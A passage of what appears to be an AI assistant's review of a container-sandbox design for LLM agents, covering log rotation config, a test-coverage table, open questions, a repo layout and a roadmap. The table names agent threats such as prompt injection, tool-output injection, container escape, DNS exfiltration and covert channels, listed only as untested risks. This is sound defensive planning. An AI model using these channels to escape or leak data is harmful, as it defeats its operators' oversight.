**7. Incomplete Audit Trail for Long-Running Agents**

- **Risk:** Agent runs for hours → audit log file grows unbounded → disk exhaustion.
- **Missing:** Log rotation, compression, remote shipping.
- **Fix:**

```yaml
logging:
  driver: "json-file"
  options:
    max-size: "10m"      # Rotate every 10MB
    max-file: "10"       # Keep 10 rotated files
    compress: "true"     # Gzip old logs
    splunk-token: "${SPLUNK_TOKEN}"  # Ship to remote SIEM
```


### **Test Coverage Gaps**

| Scenario | Coverage | Test Type |
| :-- | :-- | :-- |
| Normal tool call | ✅ Yes | Integration test |
| Prompt injection via command | ✅ Yes | Negative sandbox |
| Tool output injection | ❌ No | **Need to add** |
| GPU memory exhaustion | ❌ No | **Need stress test** |
| Concurrent agents (N>10) | ❌ No | **Need load test** |
| Container escape (kernel exploit) | ⚠️ Partial | gVisor integration needed |
| DNS exfil via timing | ❌ No | Advanced (Phase 2) |
| Covert channels (CPU affinity, cache) | ❌ No | Research phase |

### **Known Unknowns**

1. **What's the real distribution of tool sets across production agents?**
    - Assumption: Python + HTTP dominant; git/docker minority.
    - Reality: Varies by agent framework (LangGraph vs. AutoGen vs. custom).
    - Action: Survey real deployments before finalizing base images.
2. **How to detect "bad" prompts without false positives?**
    - Current: Negative sandbox (run with fake tools).
    - Problem: Fake tools may not perfectly mock real tool behavior.
    - Action: Build adversarial prompt dataset; evaluate FP/FN rates.
3. **Can ephemeral workspaces survive network partitions?**
    - Risk: Agent writes to `/agent/workspace`, network fails, container still running, workspace gets deleted.
    - Action: Implement workspace durability guarantee (persist to S3 before cleanup).
4. **How to handle long-running agents that need state?**
    - Current spec assumes ephemeral containers.
    - Need: Persistent state + checkpoint/restore.
    - Action: Phase 2 feature (integrate etcd or Redis).

***

## **[SELF-CRITIQUE]: Design Blindspots \& Reflexive Questions**

**Could the agent be using a tool in unexpected combinatorial ways?**

- ✅ **Addressed** via negative sandbox + tool compatibility matrix.
- ⚠️ **Gap:** Multi-container agent orchestration (agent spawning sub-agents) not covered.

**Are we over-optimizing for minimalism and missing usability?**

- ✅ **Addressed** via tiered profiles (minimal/standard/extended).
- ⚠️ **Gap:** No developer ergonomics guide (how to quickly iterate on tools).

**Is our reproducibility definition robust across hardware platforms?**

- ✅ **Addressed** via OCI Spec + gVisor for kernel isolation.
- ⚠️ **Gap:** Floating-point \& GPU non-determinism needs explicit pinning guide.

**Did our test prompts include adversarial multi-tool chains?**

- ❌ **Not yet.** Need to build corpus of injection prompts.
- Action: Create prompt adversarial suite (Phase 2).

**Triggers for Re-audit:**

- Toolset changes (add git/docker capability)
- Prompt behavior divergence from baseline (>10% output drift)
- Cloud platform changes (AWS Lambda → Fargate policy shift)

***

## **DELIVERABLE: Minimal-Spec Container Repo Structure**

```
drp-agent-containers-2026/
├── README.md                          # Overview + quick start
├── docs/
│   ├── architecture.md                # Full design spec (this doc)
│   ├── threat_model.md                # Attack scenarios + mitigations
│   ├── reproducibility_guide.md       # Determinism testing
│   └── troubleshooting.md             # Common failures + fixes
├── containers/
│   ├── base/
│   │   ├── Dockerfile.minimal         # Alpine + Python + curl
│   │   ├── Dockerfile.standard        # Standard profile
│   │   └── Dockerfile.extended        # Multi-tool profile
│   └── examples/
│       ├── curl_agent/                # HTTP-only agent
│       ├── python_agent/              # Computation-heavy agent
│       └── git_agent/                 # Git operations agent
├── specs/
│   ├── oci_spec_minimal.json          # OCI Runtime Spec (minimal)
│   ├── docker_compose.yml             # Multi-container orchestration
│   ├── capability_audit.yaml          # Capability matrix
│   ├── tool_compatibility.yaml        # Tool dependency graph
│   └── network_policies.yaml          # Egress filtering rules
├── scripts/
│   ├── build.sh                       # Build image + sign
│   ├── run_safe.sh                    # Launch container (hardened)
│   ├── negative_sandbox_test.py       # Prompt safety validator
│   ├── reproducibility_test.py        # Determinism checker
│   ├── audit_log_collector.py         # Centralize audit logs
│   └── cleanup.sh                     # Ephemeral workspace cleanup
├── tests/
│   ├── test_capabilities.py           # Verify cap enforcement
│   ├── test_network_isolation.py      # Verify egress blocking
│   ├── test_reproducibility.py        # Determinism tests
│   ├── test_prompt_injection.py       # Negative sandbox tests
│   └── test_resource_limits.py        # Memory/CPU quota checks
├── benchmarks/
│   ├── tool_performance.json          # Execution time baseline
│   ├── container_overhead.json        # Boot time, memory overhead
│   └── network_latency.json           # Egress filtering overhead
├── examples/
│   ├── prompt_audit.json              # Sample audit log
│   ├── reproducibility_report.json    # Determinism results
│   └── safety_report.json             # Threat detection output
└── LICENSE                            # Open-source (MIT/Apache 2.0)
```


***

## **Actionable Immediate Next Steps**

1. **[ ] Week 1:** Finalize base Dockerfile templates (minimal/standard/extended profiles)
2. **[ ] Week 2:** Implement negative sandbox validator + prompt test corpus (10–20 prompts)
3. **[ ] Week 3:** Build audit logger (JSON schema + streaming to remote SIEM)
4. **[ ] Week 4:** Hardening checklist automation (scan Dockerfile, validate spec, generate report)
5. **[ ] Week 5:** Load testing (N concurrent agents, tool call rate limits, resource exhaustion)
6. **[ ] Week 6:** Documentation + examples (git agent, curl agent, Python agent)
7. **[ ] Week 7:** Security audit (kernel CVE check, gVisor integration test)
8. **[ ] Week 8:** Release v1.0 candidate

***

Your DRP is **foundational and pragmatic**. It bridges the gap between security obsession (over-isolated → useless) and convenience (permissive → exploitable). The pattern stack (minimization → ephemeral → audit → egress → negative sandbox) creates **defense in depth** while remaining operationally feasible.

What aspect would you like me to expand—tool compatibility matrix, cloud-specific hardening (Fargate vs. Lambda), or the adversarial prompt corpus?
<span style="display:none">[^1][^2][^3][^4][^5][^6][^7][^8]</span>

<div align="center">⁂</div>

[^1]: https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/129263132/0a80d8e2-aa75-4d37-8250-d3f1185d8f0a/LLM-Tool-Use-Pattern-Ledger.md

[^2]: https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/129263132/b018f376-b238-4011-8c8d-e0048ee7a29d/Agent-AI-platform-landscape.pdf

[^3]: https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/129263132/0adaeb4a-6b63-431f-b87a-cea6a3bf228c/LLM-Reasoning-Ethics-Optimization.pdf

[^4]: https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/129263132/4044988f-8547-4bb8-9ae4-978877cc66c3/WordPress-AI-Governance-Deep-Dive.pdf

[^5]: https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/129263132/9f4e877f-c90e-4ced-a9e8-25a0f781cd9c/LLM-Prompt-Versioning-and-Memory-Framework.md

[^6]: https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/129263132/f89da644-043b-4672-92f6-b2401f43119e/LLM-Governance-Attractor-Pattern-Analysis.md

[^7]: https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/129263132/b3a370b4-c211-4e90-8faf-639371fe9ccb/Prompt-Ecosystems_-Multi-Modal-Design.pdf

[^8]: https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/129263132/f0179aa9-3a14-4e6f-af25-401638a4e831/WordPress-AI-Management-Framework.pdf

